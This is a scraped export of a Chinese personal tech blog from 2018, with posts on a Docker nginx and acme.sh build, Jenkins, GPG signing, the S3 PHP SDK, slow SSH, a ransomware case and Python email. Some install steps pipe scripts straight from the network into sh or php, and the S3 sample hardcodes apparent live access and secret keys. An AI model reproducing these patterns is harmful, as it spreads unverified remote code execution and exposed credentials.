22:44:33 CST 2018] socat doesn&apos;t exists. [Tue Jun 19 22:44:33 CST 2018] Diagnosis versions: openssl:openssl OpenSSL 1.0.1t 3 May 2016 apache: apache doesn&apos;t exists. nginx: nginx doesn&apos;t exists. socat: The command &apos;/bin/bash -c set -o pipefail &amp;&amp; /root/.acme.sh/acme.sh --issue -d awen.me -d *.awen.me --dns dns_cf --keylength ec-256 --debug&apos; returned a non-zero code: 1说明这个域名申请证书的次数过多了，你可以通过这个crt.sh是查看你的域名的申请次数，一般来说如果出现这个错误需要距离上次申请的日期顺延7天才可以。 为了减少每次 build 都去申请一次导致次数过多，可以先在本地申请，然后将本地的 /.acme.sh 目录下的证书目录拷贝过去以及保存 API 信息的 account.conf 文件拷贝到容器的/.acme.sh 目录下，这样后期只需要校验证书是否过期即可。 RUN [&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;set -o pipefail &amp;&amp; wget -O - https://get.acme.sh | sh&quot;] COPY account.conf /root/.acme.sh/account.conf COPY awen.me_ecc /root/.acme.sh/awen.me_ecc计划任务在安装 acme.sh 程序时如果没有安装 cron，则无法运行。安装 cron 很简单，类似下面这样 COPY crontab /var/spool/cron/crontabs/root RUN ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime &amp;&amp; \\ apt-get update &amp;&amp; \\ apt-get install build-essential libpcre3 libpcre3-dev zlib1g-dev wget libtool automake openssh-server supervisor cron -y &amp;&amp; \\ …… chown -R root:crontab /var/spool/cron/crontabs/root &amp;&amp; \\ chmod 600 /var/spool/cron/crontabs/root &amp;&amp; \\ touch /var/log/cron.log 使容器保持运行状态可以使用 supervisord ，安装 apt-get install supervisorsupervisord.conf 配置 [supervisord] nodaemon=true [program:sshd] command=/usr/sbin/sshd -D [program:nginx] command=/etc/init.d/nginx start [program:crontab] command=/etc/init.d/cron start然后在dockerfile 中加入 COPY supervisord.conf /etc/supervisor/conf.d/supervisord.confacme.sh 无法验证可以在本地先执行一遍，然后将/.acme.sh/account.conf 拷贝到容器的/.acme.sh/ 下 COPY account.conf /root/.acme.sh/account.conf 完整的 dockerfile 文件参考 FROM debian:jessie MAINTAINER NGINX Docker Maintainers &quot;hi@awen.me&quot; WORKDIR /opt ENV DIR=&quot;/opt/nginx/&quot; \\ ZLIB=&quot;zlib-1.2.11.tar.gz&quot; \\ ZLIB_DIR=&quot;zlib-1.2.11&quot; \\ PCRE=&quot;pcre-8.41.tar.gz&quot; \\ PCRE_DIR=&quot;pcre-8.41&quot; \\ OPENSSL=&quot;openssl-1.0.2o.tar.gz&quot; \\ OPENSSL_DIR=&quot;openssl-1.0.2o&quot; \\ NGINX=&quot;nginx-1.14.0.tar.gz&quot; \\ NGINX_DIR=&quot;nginx-1.14.0&quot; \\ NGX_BROTLI=&quot;ngx_brotli&quot; COPY sources.list.jessie /etc/apt/sources.list COPY nginx.sh /etc/init.d/nginx RUN ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime &amp;&amp; \\ apt-get update &amp;&amp; \\ apt-get install build-essential libpcre3 libpcre3-dev zlib1g-dev wget libtool automake openssh-server supervisor cron rsync -y &amp;&amp; \\ mkdir -p /opt/nginx &amp;&amp; \\ cd $DIR &amp;&amp; \\ wget -c -4 http://zlib.net/$ZLIB -O $DIR$ZLIB &amp;&amp; \\ tar zxvf $ZLIB &amp;&amp; \\ cd $ZLIB_DIR &amp;&amp; \\ ./configure &amp;&amp; \\ make &amp;&amp; \\ make install &amp;&amp; \\ cd $DIR &amp;&amp; \\ wget -c -4 https://ftp.pcre.org/pub/pcre/$PCRE -O $DIR$PCRE &amp;&amp; \\ tar zxvf $PCRE &amp;&amp; \\ cd $PCRE_DIR &amp;&amp; \\ ./configure &amp;&amp; \\ make &amp;&amp; \\ make install &amp;&amp; \\ cd $DIR &amp;&amp; \\ wget -c -4 https://www.openssl.org/source/$OPENSSL -O $DIR$OPENSSL &amp;&amp; \\ tar zxvf $OPENSSL &amp;&amp; \\ groupadd www &amp;&amp; \\ useradd -s /sbin/nologin -g www www &amp;&amp; \\ cd $DIR &amp;&amp; \\ wget -c http://file201503.oss-cn-shanghai.aliyuncs.com/awen/ngx_brotli.tar.gz &amp;&amp; \\ tar zxvf ngx_brotli.tar.gz &amp;&amp; \\ wget -c -4 https://nginx.org/download/$NGINX -O $DIR$NGINX &amp;&amp; \\ tar zxvf $NGINX &amp;&amp; \\ cd $NGINX_DIR &amp;&amp; \\ ./configure --prefix=/usr/local/nginx --user=www --group=www --with-pcre=$DIR$PCRE_DIR --with-http_v2_module --with-http_ssl_module --with-zlib=$DIR$ZLIB_DIR --with-openssl=$DIR$OPENSSL_DIR --add-module=$DIR$NGX_BROTLI &amp;&amp; \\ make &amp;&amp; \\ make install &amp;&amp; \\ rm -rf /usr/local/nginx/conf/vhost &amp;&amp; \\ mkdir /usr/local/nginx/conf/vhost &amp;&amp; \\ rm -rf /usr/local/nginx/conf/nginx &amp;&amp; \\ mkdir /usr/local/nginx/ssl &amp;&amp; \\ cd $DIR &amp;&amp; \\ mkdir -p /var/run/sshd &amp;&amp; \\ mkdir -p /var/log/supervisor &amp;&amp; \\ mkdir -p /www/www &amp;&amp; \\ mkdir -p /www/wwwlogs &amp;&amp; \\ chown -R www:www /www/ &amp;&amp; \\ rm -rf /opt/ &amp;&amp; \\ apt-get clean &amp;&amp; \\ rm -rf /var/lib/apt/lists/* &amp;&amp; \\ chmod +x /etc/init.d/nginx RUN [&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;set -o pipefail &amp;&amp; wget -O - https://get.acme.sh | sh&quot;] &amp;&amp; \\ chown -R root:crontab /var/spool/cron/crontabs/root &amp;&amp; \\ chmod 600 /var/spool/cron/crontabs/root &amp;&amp; \\ touch /var/log/cron.log &amp;&amp; \\ mkdir -p /root/.acme.sh/awen.me_ecc COPY account.conf /root/.acme.sh/account.conf COPY awen.me_ecc /root/.acme.sh/awen.me_ecc COPY supervisord.conf /etc/supervisor/conf.d/supervisord.conf COPY awen.me.conf /usr/local/nginx/conf/vhost COPY nginx.conf /usr/local/nginx/conf RUN /root/.acme.sh/acme.sh --installcert -d awen.me --ecc --keypath /usr/local/nginx/ssl/awen.me.key --fullchainpath /usr/local/nginx/ssl/awen.me.cer --reloadcmd &quot;/etc/init.d/nginx restart&quot; EXPOSE 22 80 443 VOLUME [&quot;/www/www&quot;,&quot;/www/wwwlogs&quot;] CMD [&quot;/usr/bin/supervisord&quot;]","categories":[],"tags":[{"name":"docker","slug":"docker","permalink":"https://awen.me/tags/docker/"}]},{"title":"读《动物庄园》 有感","slug":"读《动物庄园》-有感","date":"2018-06-12T22:50:36.000Z","updated":"2021-02-26T06:05:29.357Z","comments":true,"path":"posts/21737.html","link":"","permalink":"https://awen.me/posts/21737.html","excerpt":"英国著名作者乔治·奥威尔编写的一本用以反对斯大林的小说，它出版于1945年，作者主要是对于极权统治的政治讽刺，同时作者还有一本著名的反乌托邦的书《1984》，那个时候某朝还未成立呢？但是就今天来看这一正在发生的一切以及历史发展过的事情切似乎也和这几万字的小说所描述的有很多相似点吧。在某朝，这本书没有被禁，简直是奇迹。","text":"英国著名作者乔治·奥威尔编写的一本用以反对斯大林的小说，它出版于1945年，作者主要是对于极权统治的政治讽刺，同时作者还有一本著名的反乌托邦的书《1984》，那个时候某朝还未成立呢？但是就今天来看这一正在发生的一切以及历史发展过的事情切似乎也和这几万字的小说所描述的有很多相似点吧。在某朝，这本书没有被禁，简直是奇迹。 读完这本书让我印象最深刻的感悟是： 1.新的政权推翻旧的政权，总会为了拉拢人心，许下美好的愿景。比如：民主、自由、人人平等。 2.当把人类赶走之后，动物们以为从此就获得了自由，但是在工作时间上甚至比以前越来越长。而且自己产的奶、水果都被猪们拿走享用。 3.为了统治底层其他动物，要造出一个共同的敌人，比如两条腿的都是敌人，而猪们自己吃香喝辣睡人类的床时时其他的动物感到不爽就祭出自己共同的敌人–人来达到震慑作用。 4.动物们每天升旗唱《英格兰兽》。。。 5.动物们设立勋章作为为群体贡献的奖励，集体主义达到高潮。 6.拿破仑宣布不再进行例会，要有问题则由猪组成的特别委员会决定；拿破仑窃取雪球的图纸，决定建造风车；拳击手学会了口头禅“我要更努力工作”，和“拿破仑永远是正确的”； 7.物质开始短缺，拿破仑开始和人类打交道，开始经商并使用货币，违背了动物造反初期的誓言，但尖嗓成功说服动物们从来没有这些誓言；拿破仑开始自称“领袖”；拿破仑开始搬到房子里住，并睡在床上，这些都违反了“七戒”，但尖嗓仍然成功修改了历史，并说服了动物们； 8.拿破仑成为“领袖”、“慈父”，还出现了“拿破仑之歌”；再次有大量动物被害，理由基本都与雪球相关；动物又有了新的敌人“弗雷德里克”，后来又变成“皮尔京顿”；动物辛苦建立的风车再次被炸掉，动物奋起打败了“弗雷德里克”；","categories":[],"tags":[{"name":"读书笔记","slug":"读书笔记","permalink":"https://awen.me/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"}]},{"title":"Windows 服务器磁盘显示只读的解决办法","slug":"Windows-服务器磁盘显示只读的解决办法","date":"2018-06-12T07:34:52.000Z","updated":"2021-02-26T06:05:29.268Z","comments":true,"path":"posts/33410.html","link":"","permalink":"https://awen.me/posts/33410.html","excerpt":"Windows 磁盘显示磁盘为已读","text":"Windows 磁盘显示磁盘为已读 操作步骤1.打开 cmd 输入2.输入list disk，找到需要操作的磁盘3.输入select disk=2 //2为磁盘编号4. 输入 attr disk clear readonly 清除属性","categories":[],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://awen.me/tags/Windows/"}]},{"title":"使用 Jenkins 持续集成","slug":"使用-Jenkins-持续集成","date":"2018-06-12T06:15:25.000Z","updated":"2021-02-26T06:05:29.303Z","comments":true,"path":"posts/36860.html","link":"","permalink":"https://awen.me/posts/36860.html","excerpt":"什么是持续集成在讲 Jenkins 之前，我们先看下什么是持续集成 随着软件开发复杂度的不断提高，团队开发成员间如何更好地协同工作以确保软件开发的质量已经慢慢成为开发过程中不可回避的问题。尤其是近些年来，敏捷（Agile） 在软件工程领域越来越红火，如何能再不断变化的需求中快速适应和保证软件的质量也显得尤其的重要。 持续集成正是针对这一类问题的一种软件开发实践。它倡导团队开发成员必须经常集成他们的工作，甚至每天都可能发生多次集成。而每次的集成都是通过自动化的构建来验证，包括自动编译、发布和测试，从而尽快地发现集成错误，让团队能够更快的开发内聚的软件。","text":"什么是持续集成在讲 Jenkins 之前，我们先看下什么是持续集成 随着软件开发复杂度的不断提高，团队开发成员间如何更好地协同工作以确保软件开发的质量已经慢慢成为开发过程中不可回避的问题。尤其是近些年来，敏捷（Agile） 在软件工程领域越来越红火，如何能再不断变化的需求中快速适应和保证软件的质量也显得尤其的重要。 持续集成正是针对这一类问题的一种软件开发实践。它倡导团队开发成员必须经常集成他们的工作，甚至每天都可能发生多次集成。而每次的集成都是通过自动化的构建来验证，包括自动编译、发布和测试，从而尽快地发现集成错误，让团队能够更快的开发内聚的软件。 持续集成的核心价值在于： 持续集成中的任何一个环节都是自动完成的，无需太多的人工干预，有利于减少重复过程以节省时间、费用和工作量； 持续集成保障了每个时间点上团队成员提交的代码是能成功集成的。换言之，任何时间点都能第一时间发现软件的集成问题，使任意时间发布可部署的软件成为了可能； 持续集成还能利于软件本身的发展趋势，这点在需求不明确或是频繁性变更的情景中尤其重要，持续集成的质量能帮助团队进行有效决策，同时建立团队对开发产品的信心。 持续集成系统的组成由此可见，一个完整的构建系统必须包括： 一个自动构建过程，包括自动编译、分发、部署和测试等。 一个代码存储库，即需要版本控制软件来保障代码的可维护性，同时作为构建过程的素材库。 一个持续集成服务器。本文中介绍的 Jenkins 就是一个配置简单和使用方便的持续集成服务器。什么是 Jenkins Jenkins 是一个开源项目，提供了一种易于使用的持续集成系统，使开发者从繁杂的集成中解脱出来，专注于更为重要的业务逻辑实现上。同时 Jenkins 能实施监控集成中存在的错误，提供详细的日志文件和提醒功能，还能用图表的形式形象地展示项目构建的趋势和稳定性。下面将介绍 Jenkins 的基本功能。 Jenkins 官网: https://jenkins.io/ 安装yum -y install java sudo wget -O /etc/yum.repos.d/jenkins.repo https://pkg.jenkins.io/redhat-stable/jenkins.repo sudo rpm --import https://pkg.jenkins.io/redhat-stable/jenkins.io.key yum install jenkins /etc/init.d/jenkins restart chkconfig jenkins on访问1.根据提示去查看密码 如 [root@jenkins ~]# cat /var/lib/jenkins/secrets/initialAdminPassword 92ae856976dd42268a780322axxxx 2.选择安装插件 3.创建一个用户 4.然后保存后完成入门配置 5.主页面如图所示 配置全局工具1.系统管理–全局工具配置 2.可以添加例如 Java docker maven 等。","categories":[],"tags":[{"name":"jenkins","slug":"jenkins","permalink":"https://awen.me/tags/jenkins/"}]},{"title":"github commit 时加上 GPG 签名","slug":"github-commit-时加上-GPG-签名","date":"2018-06-10T01:36:18.000Z","updated":"2021-02-26T06:05:29.273Z","comments":true,"path":"posts/19637.html","link":"","permalink":"https://awen.me/posts/19637.html","excerpt":"安装我是安装的这个 https://gpgtools.org/","text":"安装我是安装的这个 https://gpgtools.org/ 生成密钥1.执行以下命令生成密钥，注意这里的邮箱要填你 github 认证的邮箱 gpg --full-generate-key 2.查看密钥列表 gpg --list-keys会列出如下信息 pub rsa4096 2018-06-10 [SC] [有效至：2042-06-10] 429825C5AD6A2BA12AAB7E3C4200719FE9EBA033 uid [ 绝对 ] wenjun fang &lt;hi@awen.me&gt; sub rsa4096 2018-06-10 [E] [有效至：2042-06-10]其中： pub表示公钥的算法和长度 以及创建时间和有效期。 429825C5AD6A2BA12AAB7E3C4200719FE9EBA033 是密钥表示，一般取最后6位 EBA033 配置 github全局配置 git config --global user.signingkey E9EBA033 # 绑定上面的密钥标识 设置全局提交验证，如果设置为 true 则所有仓库提交时都会进行加密 git config --global commit.gpgsign true # 设置全局验证 单次提交验证 git commit -S -m &quot;commit content&quot; 导出密钥内容 gpg --armor --output public-key.txt --export E9EBA033然后在 github 添加 GPG Key 效果","categories":[],"tags":[{"name":"GitHub","slug":"GitHub","permalink":"https://awen.me/tags/GitHub/"}]},{"title":"使用 AWS S3的 PHP SDK","slug":"使用-AWS-S3的-PHP-SDK","date":"2018-06-08T08:23:06.000Z","updated":"2021-02-26T06:05:29.302Z","comments":true,"path":"posts/29562.html","link":"","permalink":"https://awen.me/posts/29562.html","excerpt":"网易云的对象存储接口是开放了部分兼容 S3 的方法，具体说明参考官方说明通过 S3 的 PHP SDK 是可以操作网易云的对象存储的。具体操作步骤如下:","text":"网易云的对象存储接口是开放了部分兼容 S3 的方法，具体说明参考官方说明通过 S3 的 PHP SDK 是可以操作网易云的对象存储的。具体操作步骤如下: 安装 SDKcurl -sS https://getcomposer.org/installer | php mv composer.phar /usr/local/bin/composer chmod +x /usr/local/bin/composer 新建一个目录为 php，在其中执行 composer require aws/aws-sdk-php 注: 国内网络可能执行此命令无反应，原因是因为Great Firewall (of China)，建议通过 github 获取，地址在这里 得到目录结构如下 # ls composer.json composer.lock vendor初始化部分代码1.创建一个 createbucket.php 的文件，内容如下 &lt;? require &apos;vendor/autoload.php&apos;; use Aws\\S3\\S3Client; $client = new S3Client([ &apos;version&apos; =&gt; &apos;latest&apos;, &apos;region&apos; =&gt; &apos;us-east-1&apos;, # 可用区必须是这个 &apos;credentials&apos; =&gt; [ &apos;key&apos; =&gt; &apos;ada35f4a19ac0bea6aedd1c5ed3bbea1&apos;, # AccessKey &apos;secret&apos; =&gt; &apos;9c31953f54882587e67369e970d02262&apos;, # SecretKey ], &apos;endpoint&apos; =&gt; &apos;https://nos-eastchina1.126.net&apos; # Endpoint ]); 2.测试创建桶 $bucketName = &apos;netease3456&apos;; # 桶名 try { $result = $client-&gt;createBucket([ &apos;Bucket&apos; =&gt; $bucketName, // REQUIRED &apos;ACL&apos; =&gt; &apos;public-read&apos;, ]); } catch (Aws\\S3\\Exception\\S3Exception $e) { // output error message if fails echo $e-&gt;getMessage(); } 注: 网易云的接口暂时还不支持子账号创建桶，如需要可以使用网易云的 nos-php-sdk","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://awen.me/tags/PHP/"}]},{"title":"Python 闭包","slug":"Python-闭包","date":"2018-06-03T23:01:31.000Z","updated":"2021-02-26T06:05:29.263Z","comments":true,"path":"posts/7704.html","link":"","permalink":"https://awen.me/posts/7704.html","excerpt":"什么是闭包 闭包是指绑定外部变量的函数，例如","text":"什么是闭包 闭包是指绑定外部变量的函数，例如 123456789101112 def pow_x(x): def echo(value): return value**x return echo lst &#x3D; [pow_x(2),pow_x(3),pow_x(4)] for p in lst: print(p(2)) 特点1.嵌套函数2.内部函数用到了外部变量3.外部函数返回内部函数 4.内部函数不能改变外部变量 5.内部函数用到了外部变量的 list，则可以从外部或内部改变值，并且及时外部没有引用也不会回收。 def pow_x(x): def echo(value): # x = 2 # 如果使用了局部变量，外部参数无论如何也进不来了。 return value**x return echo lst = [pow_x(2),pow_x(3),pow_x(4)] for p in lst: print(p(2))","categories":[],"tags":[]},{"title":"SSH 卡很久的解决办法","slug":"SSH-卡很久的解决办法","date":"2018-05-28T23:05:55.000Z","updated":"2021-02-26T06:05:29.265Z","comments":true,"path":"posts/20399.html","link":"","permalink":"https://awen.me/posts/20399.html","excerpt":"遇到 SSH 卡很久，大概要30秒以上怎么解决？ 这种情况首先确认下 sshd_config 中的2个配置是否是如下这样： UseDNS no GSSAPIAuthentication no","text":"遇到 SSH 卡很久，大概要30秒以上怎么解决？ 这种情况首先确认下 sshd_config 中的2个配置是否是如下这样： UseDNS no GSSAPIAuthentication no UseDNS 选项打开状态下，当客户端试图登录SSH服务器时，服务器端先根据客户端的IP地址进行DNS PTR反向查询出客户端的主机名，然后根据查询出的客户端主机名进行DNS正向A记录查询，验证与其原始IP地址是否一致，这是防止客户端欺骗的一种措施，但一般我们的是动态IP不会有PTR记录，打开这个选项不过是在白白浪费时间而已，不如将其关闭。 另外一个是GSSAPI 认证会消耗很长时间，其实关闭了也没多大影响，一般 SSH 依次进行的认证方法的是 publickey, gssapi-keyex, gssapi-with-mic, password， 这个你可以ssh -v开启 debug 模式在连接日志看到。 一般用户只使用 password 认证方式，但前面 3 个认证过程系统还是会尝试，这就浪费时间了，也就造成 SSH 登录慢。关于 GSSAPI 相关的认证，消耗的时间比较多，具体可以查看 SSH 连接日志。GSSAPI 主要是基于 Kerberos 的，因此要解决这个问题也就变成要系统配置有 Kerberos， 一般用户是没有配置 Kerberos的 此外，我发现 systemd 的一个 bug 也会影响 ssh 登录慢，甚至还会影响操作系统内的任何操作，例如 su 通过 ssh -v 查看连接详情，发现会卡在 pledge: network 这里很久， ... debug1: Authentication succeeded (publickey). Authenticated to myserver.mydomain.com ([xx.xx.xx.xx]:22). debug1: channel 0: new [client-session] debug2: channel 0: send open debug1: Requesting no-more-sessions@openssh.com debug1: Entering interactive session. debug1: pledge: network另外在系统认证日志中会出现 pam_systemd(sshd:session): Failed to create session: Connection timed out这种情况，可以重启下systemd-logind systemctl restart systemd-logind具体这个问题，可以参考这里","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"使用 Postman 调用 AWS 接口上传文件到网易云","slug":"使用-Postman-调用-AWS-接口上传文件到网易云","date":"2018-05-23T03:31:55.000Z","updated":"2021-02-26T06:05:29.303Z","comments":true,"path":"posts/23749.html","link":"","permalink":"https://awen.me/posts/23749.html","excerpt":"本文主要演示如何通过 postman 调用 AWS 接口操作网易云对象存储实现文件上传。 1.首先，打开 postman，在 postman 界面选择 HTTP 协议为 PUT，在后面的地址栏输入","text":"本文主要演示如何通过 postman 调用 AWS 接口操作网易云对象存储实现文件上传。 1.首先，打开 postman，在 postman 界面选择 HTTP 协议为 PUT，在后面的地址栏输入 https://&lt;bucket&gt;.nos-eastchina1.126.net/&lt; objectkey&gt;其中 bucket 为你的桶名，objectkey 为上传到存储的文件名 2.然后切换到 Authorization 选择 TYPE 为 AWS Signature 在右侧输入网易云控制台获取的 Accesskey 和 Secretkey 值，ADVANCED 下 的 AWS Region 输入 esatchina1，Service Name 输入 s3 3.点击 Preview Request 后切换到 Headers，可以看到加载的请求头如下： 切换到 Body 选择 raw，输入 test，如图所示 5.然后点击 Send 发送请求，可以看到 Status 为 200 OK 说明请求成功了。 6.这个时候，去访问 https://netease01.nos-eastchina1.126.net/test.js 即可。","categories":[],"tags":[{"name":"postman","slug":"postman","permalink":"https://awen.me/tags/postman/"}]},{"title":"服务器被黑怎么办","slug":"服务器被黑怎么办","date":"2018-05-16T10:58:12.000Z","updated":"2021-02-26T06:05:29.342Z","comments":true,"path":"posts/25731.html","link":"","permalink":"https://awen.me/posts/25731.html","excerpt":"某用户找到我们说他服务器 /data 目录下文件没有了，我们给他进行排查后发现其 root 目录下有一个 READ_THIS.txt 打开有一行字 View here: https://pastebin.com/raw/y7f6pnjx for information on how to obtain your files!","text":"某用户找到我们说他服务器 /data 目录下文件没有了，我们给他进行排查后发现其 root 目录下有一个 READ_THIS.txt 打开有一行字 View here: https://pastebin.com/raw/y7f6pnjx for information on how to obtain your files! 打开这个网站大概是你的文件只有我们能给你找回来，你需要给我的比特币账户打上0.1 BTC ，并提供转账截图发邮件给我们，并且黑客还很客气的说他们都是是商人，如果您遵循他们的要求，就会很好地对待你哦。 题外话，现在比特币还是很火啊！0.1btc 等于836美元5323.21 人民币 我在未处理这个用户之前我就判断2种可能性，要么他自己删了，要么是被黑了。 为什么你的服务器会被黑？其实不管是 windows 还是 linux 或是运行在操作系统之上的应用软件都存在已知或未至的漏洞，那么黑客通常利用这些漏洞就能入侵你的服务器盗取你的资料或者干任何想干的事情。 如何防范首先，你需要经常更新你的操作系统，给你的系统升级，打补丁，对已知的漏洞进行修复。其次，各种软件也要经常更新升级修复漏洞。再次，系统自身的安全防护要做好，一般来说不要开放不信任的端口，或重要服务不要给任何 IP 都有访问的权限，比如mysql、redis 数据库等等。修改默认的远程端口等等。网站自身的安全防护也要做好，避免一些诸如 XSS WAF 之类的攻击或者对外提供了 SQL 注入的机会。 另外，重要数据要定期备份到安全的地方，如果是使用云服务器可以使用它们的快照或镜像功能，定期制作快照。 你要知道，只要你的设备联网了，那他就是不安全的，任何时候都有可能被入侵，被攻击。所以提高安全意识加上必要的技术手段辅助防范是必须的。","categories":[],"tags":[]},{"title":"python3 从配置文件读取配置","slug":"python3-从配置文件读取配置","date":"2018-05-08T12:17:15.000Z","updated":"2021-02-26T06:05:29.286Z","comments":true,"path":"posts/56294.html","link":"","permalink":"https://awen.me/posts/56294.html","excerpt":"有时候我们会把一些经常变动的参数或者不方便写入代码里面的参数，比如密码账号写入一个文件中，然后读取这个文件中的值来加载到内存去运行。在 python3 中 我们可以这样操作:","text":"有时候我们会把一些经常变动的参数或者不方便写入代码里面的参数，比如密码账号写入一个文件中，然后读取这个文件中的值来加载到内存去运行。在 python3 中 我们可以这样操作: 1.定义一个 config.ini 的配置文件 ;config.ini [email] email = wenjun.fang@fangwenjun.com password = 123456 [user id] id = 27 2.读取配置文件 from configparser import ConfigParser cfg = ConfigParser() cfg.read(&apos;config.ini&apos;) print(cfg.sections()) # 输出 [&apos;email&apos;, &apos;user id&apos;] print(cfg.get(&apos;email&apos;,&apos;email&apos;)) # 输出 wenjun.fang@fangwenjun.com 用 python就是这么简单。","categories":[],"tags":[{"name":"python3","slug":"python3","permalink":"https://awen.me/tags/python3/"}]},{"title":" 五一海岛游","slug":"五一海岛游","date":"2018-05-05T03:10:20.000Z","updated":"2021-02-26T06:05:29.299Z","comments":true,"path":"posts/60925.html","link":"","permalink":"https://awen.me/posts/60925.html","excerpt":"这个五一去了趟福建东甲岛和塘屿岛。因为考虑去其他大的旅游景点人特别多，都是看人头，没意思，于是找了个户外去个人少点的地方玩。 4月29号坐高铁到福州站大概1点集合转汽车去平潭坐船，3点到达港口乘船1个小时到达目的地，这也是我第一次坐船出海。","text":"这个五一去了趟福建东甲岛和塘屿岛。因为考虑去其他大的旅游景点人特别多，都是看人头，没意思，于是找了个户外去个人少点的地方玩。 4月29号坐高铁到福州站大概1点集合转汽车去平潭坐船，3点到达港口乘船1个小时到达目的地，这也是我第一次坐船出海。 第一天先到达东甲岛，东甲岛，俗称简单金银岛，也是为闽台贸易岛。地理坐标25°17′N，119°45′E东甲岛，是福建省平潭县最南端海域临近台湾海峡的一座远离大陆的偏僻荒岛，在平潭县海坛岛南部，距草屿约9公里。南北走向，长1.4公里，宽0.5公里，面积1.567平方公里。 岛上就住着一户人家，房子很破旧，岛主姓黄，我们称其为黄岛主，黄岛主的明显标志就是带着大金链子。岛主家养了很多羊啊、鸡的 羊骚味很浓啊。 我们上岛后开始租帐篷，因为路程远，也没买装备，二来觉得背着累就租了，费用50一天，这天岛上来了很多的户外团，整个小岛大概就200多人。 架完帐篷后在海边沙滩走走，晚上放烟火、篝火唱歌、看孔明灯，据说还有人求婚，晚上睡着帐篷，听了一晚上的海浪声，也不枉此生住了一天海景房啊！哈哈哈哈。 第二天早上很早爬起来看日出，可惜天气不好没看成 我们都戏称东甲岛是乞丐版马尔代夫。 中午乘船去塘屿岛，塘屿岛就比东甲岛大多了，岛上有很多人住着和陆地其实没什么区别，我们租了个家庭式的房间，有客厅、房间、卫生间、沙发、茶几、阳台，看着电视、喝着铁观音，吃着西瓜，美滋滋。 然后去了当地的景点逛逛继续看海景，当地有个金沙滩和海天一线，海景还是蛮不错的。 可能因为很少闻到鱼腥味的原因，一到塘屿岛就闻到了很重的鱼腥味，受不了那个味道。 这次行程中遇到了帅哥和小姐姐蛮多的，人也都还不错。大家互帮互助一起玩的很开心，总的来说这个五一过的挺有意思的。 帮着渔民捞鱼，结果捞出来的都是小鱼苗","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://awen.me/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"我为什么不用中国移动的流量了","slug":"我为什么不用中国移动的流量了","date":"2018-05-05T02:44:03.000Z","updated":"2021-02-26T06:05:29.335Z","comments":true,"path":"posts/65406.html","link":"","permalink":"https://awen.me/posts/65406.html","excerpt":"5月份开始我把移动的套餐更换为目前“最便宜”的 18元套餐了，本来是想办8元保号的套餐，但是被移动取消了，没办法直接办理，准备工信部投诉一波试试看看效果如何。","text":"5月份开始我把移动的套餐更换为目前“最便宜”的 18元套餐了，本来是想办8元保号的套餐，但是被移动取消了，没办法直接办理，准备工信部投诉一波试试看看效果如何。 为什么不用移动的流量了？中国移动给人的感觉就是流量超级贵，我用移动十几年了，之前办理了139 省内不限量，平均一个月话费要140多，扣除移动送的60多话费，也要将近小100的话费。 而一旦离开了省内这个流量就不够用了，从上面的数据看五一出去一趟就不够用了，24小时2G 全国流量就要15块钱着实伤不起，另外中国移动总是送一些比如咪咕爱看 20G 的流量，其实对于我来说完全没啥必要，移动的咪咕爱看里内容那么少，界面那么丑，完全不想去使用。 新方案综合比较下我选择了移动保号+联通大王卡的模式，毕竟换了双卡手机后这个还是很好的方式。 移动走电话，电话一个月也没几次，之前还经常和爸妈电话，现在都微信联系了，短信几个月都发不到十条，但是移动的覆盖率确实比联通好，我老家就只有移动信号，联通很弱。但是在家都是 WiFi，不怎么需要数据流量。 18元移动月租 + 19元腾讯大王卡 = 一个至少37块钱，为什么是至少？因为还有其他软件是不免流的。 腾讯大王卡的坑大王卡19元，微信、QQ、腾讯视频免流 这个对于我来说是很实在的，腾讯视频的资源可比咪咕爱看的资源多的多了，此外我还有会员，另外日常和亲戚朋友客户沟通都是微信，所以我选择了大王卡，但是大王卡也有坑，就是你不可能只使用腾讯的免流软件，比如支付宝啊、淘宝啊 这些都不免流。还有系统自己的软件总会不可避免的要耗费些流量，那如果触发了日租宝就是1块钱一天800M全国流量，这个流量是可以升级到1G 的(即使这样也比移动1天15块钱便宜很多啊)，不过大王卡每月送1G(有限制条件)，另外联通的流量活动多，很多APP有各种活动可以拿个1-2G/月，所以相对来说是可以避免触发日租宝的，比如飞猪、联通客户端。另外联通每月40G 上限，到了就禁止上网了。所以不限量也只是文字游戏 其他方案除了腾讯大王卡，还有支付宝也推出了鱼卡，网易的白金卡等等。不过这些软件我都用的频率不高，所以没有选择。 #Update 联通还是不要办的好，太烂了。","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://awen.me/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"python3 发送邮件","slug":"python3-发送邮件","date":"2018-05-02T07:39:51.000Z","updated":"2021-02-26T06:05:29.287Z","comments":true,"path":"posts/58994.html","link":"","permalink":"https://awen.me/posts/58994.html","excerpt":"python 3 发送邮件其实很简单，不过有很多需要注意的地方： 1.比如使用网易邮箱开启了应用密码，则应该使用应用密码2.尽可能使用 SSL，但是使用 SSL 需要注意配置 smtplib.SMTP_SSL(smtp_server,smtp_port)","text":"python 3 发送邮件其实很简单，不过有很多需要注意的地方： 1.比如使用网易邮箱开启了应用密码，则应该使用应用密码2.尽可能使用 SSL，但是使用 SSL 需要注意配置 smtplib.SMTP_SSL(smtp_server,smtp_port) 否则会报错 3.网易邮箱或一些邮箱必须加上 msg[&apos;From&apos;] = msg[&apos;To&apos;] = msg[&apos;Subject&apos;] = 否则会发送不成功 完整代码如下： def send_email(self,ticket_id,user=None): def format_addr(s): name, addr = parseaddr(s) return formataddr((Header(name, &apos;utf-8&apos;).encode(), addr)) from_addr = password = smtp_server = to_addr = smtp_port = 465 msg = MIMEText(&quot;hello,world&quot;, &apos;plain&apos;, &apos;utf-8&apos;) # 发送邮箱地址 msg[&apos;From&apos;] = format_addr(&quot;python 开发者&quot; % from_addr) # 收件箱地址 msg[&apos;To&apos;] = to_addr # 主题 msg[&apos;Subject&apos;] = &quot;测试测试&quot; % ticket_id server = smtplib.SMTP_SSL(smtp_server,smtp_port) server.set_debuglevel(1) server.login(from_addr, password) 